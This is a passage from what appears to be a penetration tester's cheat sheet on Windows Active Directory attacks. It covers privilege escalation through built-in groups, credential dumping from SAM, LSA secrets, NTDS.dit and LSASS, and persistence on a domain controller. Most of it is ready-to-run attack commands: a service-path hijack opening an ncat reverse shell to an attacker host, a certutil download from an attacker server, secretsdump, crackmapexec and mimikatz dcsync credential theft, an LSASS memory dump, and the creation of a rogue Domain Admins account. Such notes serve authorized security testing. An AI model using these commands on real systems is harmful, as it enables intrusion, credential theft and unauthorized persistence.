- [AdminDNS-ToSystem.ps1](https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/AdminDNS-ToSystem.ps1)

### EventLogReaders

Members of *Event Log Readers* groups have privilege to read *event log*. These logs may contain sensitive information. 

```shell
#Get members of the group
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Event Log Readers"

# To find "net [...] /user:blahblah password"
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# Using other users creds
wevtutil qe Security /rd:true /f:text /r:share01 /u:<username> /p:<pwd> | findstr "/user"

# Search using PowerShell
Get-WinEvent -LogName security [-Credential $creds] | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

### PrintOperators

Members of such group can:
- having `SeLoadDriverPrivilege` privilege
- log in at the DC and do *shutdown*
- manage, create, share and delete printers connect to the DC

*NB*: if the `whoami /priv` command does not show `SeLoadDriverPrivilege` from a non-elevated context, then UAC must be bypassed.

By exploiting the `SeLoadDriverPrivilege` privilege, it is possible to do *privilege escalation*.

### RemoteDesktopUsers

Members of such group have RDP access to the machines.

### RemoteManagementUsers

Members of such group have WinRM access to the machines.

### ServerOperators

Members of this group can configure certain options at the DC:
- local logon
- backup of files and directories
- `SeBackupPrivilege` e `SeRestorePrivilege`
- edit *system time* 
- edit *time box*
- force remotely shutdown
- restore of files and directories
- system shutdown
- manage local service ([Server Operator Group - Win privesc](https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/))

#### Server Operators - Privilege Escalation

**Steps**:
1. upload *netcat* on target machine ([https://github.com/int0x33/nc.exe/](https://github.com/int0x33/nc.exe/))
2. finding a service runned by LocalSystem. Example: *dns* service (`cmd.exe /c "sc qc dns"`)
3. exploitation - two options:
	- adding current user to local Administrators group
		- `cmd.exe /c 'sc config <SERVICE> binPath="cmd /c net localgroup Administrators <USER OWNED> /add"'`
		- `cmd.exe /c "sc qc <SERVICE>"`
		- `cmd.exe /c "sc stop <SERVICE>"`
		- `cmd.exe /c "sc start <SERVICE>"`
		- **hai privilegi di Administrator, ma non avrai direttamente una shell come Administrator o SYSTEM**
	- a shell with SYSTEM privileges (*preferable*)
		- `cmd.exe /c 'sc config <SERVICE> binPath="C:\absolute\path\to\ncat.exe -e cmd.exe <IP ATTACKER> <REVERSE PORT>'`
		- (attaccante) `rlwrap nc -nvlp <REVERSE PORT>`
		- `cmd.exe /c "sc qc <SERVICE>"`
		- `cmd.exe /c "sc stop <SERVICE>"`
		- `cmd.exe /c "sc start <SERVICE>"`

### DistributedCOMUsers

**Use case** (credit: [https://simondotsh.com/infosec/2021/12/29/dcom-without-admin.html](https://simondotsh.com/infosec/2021/12/29/dcom-without-admin.html)):
- non-admin user member of "Distributed COM Users" group

When analyzing a *BloodHound* graph, one may see from time to time an edge where a user or group can compromise a host via ***ExecuteDCOM***. The conditions under which a non-administrator user can execute remote commands are as follows:
- user member of "Distributed COM Users" group
- `Remote Launch` and `Remote Activation` privileges are required (is not the case out-of-the-box for the `MMC20.Application` object)

Blind command execution - *dcomexec.py* Python script from *impacket* suite:
- `python3 dcomexec.py -object MMC20 -silentcommand <DOMAIN>/<USERNAME>:<PASSWORD>@<IPTARGET> 'certutil -urlcache -f http://<IPATTACKERHTTP>/dcomTest'`

# Dump Secrets

There are a lot of *secrets* that can be dumped simply with *crackmapexec*. You can view all with `crackmapexec smb -L`.
## SAM

**Requirements**:
- password or NT hash of a *local admin* at the target

**SAM file contains NT and LM hashes of local accounts**.

*Remote Dumping*:

```shell
# local admin credentials
crackmapexec smb <IP TARGET> -u <LOCAL ADMIN USERNAME> -H <LOCAL ADMIN USERNAME HASH NT> --local-auth --sam
# case where domain user is a local admin
crackmapexec smb <IP TARGET> -u <LOCAL ADMIN USERNAME> -H <LOCAL ADMIN USERNAME HASH NT> --sam
```

```shell
python3 secretsdump.py <DOMAIN NAME>/'<USERNAME>:<PASSWORD>'@<IP TARGET>
```

*Offline Dumping*:

```shell
python3 secretsdump.py -security '/path/to/security.save' -sam '/path/to/sam.save' LOCAL
```

## LSAsecrets

**Requirements**:
- password or NT hash of a *local admin* at the target
- SECURITY and SYSTEM hives

**LSA secrets is special registry storage used to save sensitive data accessible only by the local SYSTEM user. On the disc, LSA secrets are saved in the hive SECURITY, encrypted with a key in the hive SYSTEM. In the LSA secrets you can find:**
- **cached domain credentials**
- **domain computer account**
- **service users' passwords**
- **Auto-logon password**
- **DPAPI master keys**

*Remote Dumping*:

```shell
# local admin credentials
crackmapexec smb <IP TARGET> -u <LOCAL ADMIN USERNAME> -H <LOCAL ADMIN HASH NT> --local-auth --lsa
# case where domain user is a local admin
crackmapexec smb <IP TARGET> -u <LOCAL ADMIN USERNAME> -H <LOCAL ADMIN HASH NT> --lsa
```

```shell
python3 secretsdump.py <DOMAIN NAME>/'<USERNAME>:<PASSWORD>'@<IP TARGET>
```

*Offline Dumping*:

```shell
python3 secretsdump.py -security '/path/to/security.save' -system '/path/to/system.save' LOCAL
```

## NTDS.dit

**Requirements**:
- password or NT hash of a domain account member of Domain Admins group
- NTDS.dit file
- SYSTEM hive

**NTDS.dit file, located at the Domain Controller(s), represents the central database of the AD domain and contains all domain objects, including user credentials**.

*Remote Dumping*:

```shell
crackmapexec smb <IP DC> -d <DOMAIN> -u <DOMAIN ADMIN USERNAME> -H <DOMAIN ADMIN HASH NT> --ntds
```

```shell
python3 secretsdump.py <DOMAIN NAME>/'<DOMAIN ADMIN USERNAME>:<PASSWORD>'@<IP DC>
```

```shell
# extract NT hash only from NTDS.dit
python3 secretsdump.py <DOMAIN NAME>/'<DOMAIN ADMIN USERNAME>:<PASSWORD>'@<IP DC> -just-dc-ntlm
```

*Offline Dumping*:

```shell
python3 secretsdump.py -ntds '/path/to/NTDS.dit' -system '/path/to/system.save' LOCAL
```

## LSASS

**Requirements**:
- password or NT hash of a *local admin* account

**The LSASS process handles the security-related operations of a machine, including user authentication. Specifically, the process captures the credentials of users who have performed an *interactice logon* on the machine. We can therefore find**:
- **tickets and keys Kerberos**
- **NT hashes of users currently logged in the machine**
- **plain-text passwords for services in some older configurations**

*Remote Dumping*:

```shell
# local admin credentials
crackmapexec smb <IP TARGET> -u <LOCAL ADMIN USERNAME> -H <LOCAL ADMIN HASH NT> --local-auth -M lsassy
# case where domain user is a local admin
crackmapexec smb <IP TARGET> -u <LOCAL ADMIN USERNAME> -H <LOCAL ADMIN HASH NT> -M lsassy
```

*Offline Dumping*:

1. LSASS dump (*command must be executed within the machine.*)

```shell
# (require: *ErrorCode: 0, ReturnCode: 1*)
procdump.exe -accepteula -ma lsass lsass.dmp
```

2. offline dump analysis

```shell
pypykatz lsa minidump lsass.dmp
```

# DomainAdminsPersistence

**Requirements**:
- a shell with an user member of Domain Admins group
- a shell on DC machine

## dcsync on domain controller

- *secretsdump* - SAM and NTDS dump:
	- `python3 examples/secretsdump.py <DOMAIN NAME>/'<DOMAIN ADMIN USERNAME>:<PASSWORD>'@<IP DC>`
- *mimikatz* - NTDS dump:
	- `.\mimikatz.exe "lsadump::dcsync /domain:beyond.com /all /csv" exit`
- *mimikatz* - hash NT Administrator domain user dump:
	- `.\mimikatz.exe "lsadump::dcsync /domain:beyond.com /user:Administrator" exit`

## create privileged account

Step:
1. create a new domain account
	- `net user pablo I4mPabl0! /add /domain`
2. add new user in "Domain Admins" group
	- `net group "Domain Admins" pablo /add /domain`
3. you can use *psexec* and get a shell with SYSTEM privileges on DC

